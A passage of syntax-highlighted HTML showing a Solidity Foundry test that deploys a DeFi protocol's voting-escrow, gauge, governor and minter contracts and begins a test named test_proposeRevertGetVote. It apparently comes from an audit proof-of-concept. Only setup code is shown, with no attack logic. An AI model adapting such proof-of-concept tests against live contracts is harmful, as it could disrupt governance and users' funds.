class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e( \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDepositor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_proposeRevertGetVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_initialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//zero % ownership of top protcols\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreate_lock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e365\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edays\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 